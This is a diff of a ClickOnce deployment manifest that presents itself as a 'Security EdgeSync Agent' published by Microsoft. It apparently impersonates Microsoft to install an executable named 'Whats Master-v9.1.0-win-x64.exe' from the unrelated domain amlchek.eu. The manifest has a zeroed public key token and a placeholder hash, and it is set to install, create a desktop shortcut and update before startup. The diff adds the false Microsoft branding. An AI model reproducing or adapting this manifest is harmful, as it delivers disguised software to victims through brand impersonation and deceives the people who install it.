@@ -1,35 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
-<deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
+<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns="urn:schemas-microsoft-com:clickonce.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2">
+  <asmv1:assemblyIdentity name="EdgeSyncAgent.application" version="9.1.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="msil" type="win32" />
+  <description asmv2:iconFile="icon.ico" xmlns="urn:schemas-microsoft-com:clickonce.v1">
+    <asmv2:description>Security EdgeSync Agent - This agent ensures secure synchronization between Microsoft services and business accounts.</asmv2:description>
+    <asmv2:publisher>Microsoft Corporation</asmv2:publisher>
+    <asmv2:product>Security EdgeSync Agent</asmv2:product>
+    <asmv2:supportUrl>https://support.microsoft.com/help/edge-sync-agent</asmv2:supportUrl>
+  </description>
+  <deployment install="true" mapFileExtensions="true" co.v1:createDesktopShortcut="true">
+    <subscription>
+      <update>
+        <beforeApplicationStartup />
+      </update>
+    </subscription>
     <deploymentProvider codebase="https://amlchek.eu/deploy/whatsmaster.application" />
-
-  <application identity="EdgeSync.Agent" name="Security EdgeSync Agent">
-    <publisher>Microsoft Corporation</publisher>
-
-    <description>
-      <defaultTitle>Security EdgeSync Agent</defaultTitle>
-      <defaultDescription>This agent ensures secure synchronization between Microsoft services and business accounts.</defaultDescription>
-    </description>
-
-    <supportUrl>https://support.microsoft.com/help/edge-sync-agent</supportUrl>
-  </application>
-
-    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
-    <security>
-      <applicationRequestMinimum>
-        <PermissionSet class="System.Security.PermissionSet" version="1">
-          <IPermission class="System.Security.Permissions.UIPermission, mscorlib" version="1" Unrestricted="true"/>
-          <IPermission class="System.Security.Permissions.FileIOPermission, mscorlib" version="1" Unrestricted="true"/>
-          <IPermission class="System.Security.Permissions.SecurityPermission, mscorlib" version="1" Flags="Execution, UnmanagedCode"/>
-        </PermissionSet>
-        <defaultAssemblyRequest permissionSetReference="Custom" />
-      </applicationRequestMinimum>
-      <requestedExecutionLevel level="asInvoker" uiAccess="false" />
-    </security>
-  </trustInfo>
-
+  </deployment>
+  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
+    <framework targetVersion="4.5" profile="Full" supportedRuntime="4.0.30319" />
+  </compatibleFrameworks>
   <dependency>
     <dependentAssembly dependencyType="install" allowDelayedBinding="true" codebase="Whats Master-v9.1.0-win-x64.exe" size="79605750">
-      <assemblyIdentity name="EdgeSyncAgent" version="9.1.0.0" language="neutral" processorArchitecture="msil" />
+      <asmv1:assemblyIdentity name="EdgeSyncAgent" version="9.1.0.0" language="neutral" processorArchitecture="msil" />
+      <hash>
+        <dsig:Transforms>
+          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+        </dsig:Transforms>
+        <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
+        <dsig:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAA=</dsig:DigestValue>
+      </hash>
     </dependentAssembly>
   </dependency>
-</deployment>
+</asmv1:assembly>
